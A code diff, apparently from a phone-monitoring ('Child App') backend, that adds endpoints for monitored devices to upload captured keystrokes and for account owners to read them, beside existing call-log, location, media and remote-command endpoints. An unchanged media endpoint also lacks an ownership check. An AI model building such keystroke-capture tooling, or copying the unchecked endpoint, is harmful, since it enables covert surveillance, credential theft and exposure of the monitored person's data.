@@ -167,6 +167,17 @@ def read_locations_for_user(
         return crud.get_locations_by_device(db=db, device_id=device_id, skip=skip, limit=limit)
     return crud.get_locations_by_user(db=db, user_id=current_user.id, skip=skip, limit=limit)
 
+@router.get("/users/me/keylogs/", response_model=List[schemas.Keylog])
+def read_keylogs_for_user(
+    device_id: int = None, skip: int = 0, limit: int = 1000, db: Session = Depends(get_db), current_user: models.User = Depends(get_current_user)
+):
+    if device_id:
+        devices = crud.get_devices_by_user(db=db, user_id=current_user.id)
+        if not any(d.id == device_id for d in devices):
+            raise HTTPException(status_code=403, detail="Device not owned by user")
+        return crud.get_keylogs_by_device(db=db, device_id=device_id, skip=skip, limit=limit)
+    return crud.get_keylogs_by_user(db=db, user_id=current_user.id, skip=skip, limit=limit)
+
 # Device Telemetry Endpoints (for Child App)
 @router.post("/devices/me/call_logs/", response_model=schemas.CallLog)
 def create_call_log_for_device(
@@ -257,4 +268,14 @@ def send_command(device_id: int, command: schemas.CommandBase, db: Session = Dep
 @router.get("/devices/{device_id}/media/", response_model=List[schemas.MediaFile])
 def read_media(device_id: int, skip: int = 0, limit: int = 100, db: Session = Depends(get_db), current_user: models.User = Depends(get_current_user)):
     return crud.get_media_by_device(db=db, device_id=device_id, skip=skip, limit=limit)
+
+@router.post("/devices/me/keylogs/", response_model=schemas.Keylog)
+def create_keylog_for_device(
+    keylog: schemas.KeylogCreate,
+    db: Session = Depends(get_db),
+    current_device: models.Device = Depends(get_current_device)
+):
+    keylog.device_id = current_device.id
+    return crud.create_user_keylog(db=db, keylog=keylog, user_id=current_device.owner_id)
+
 
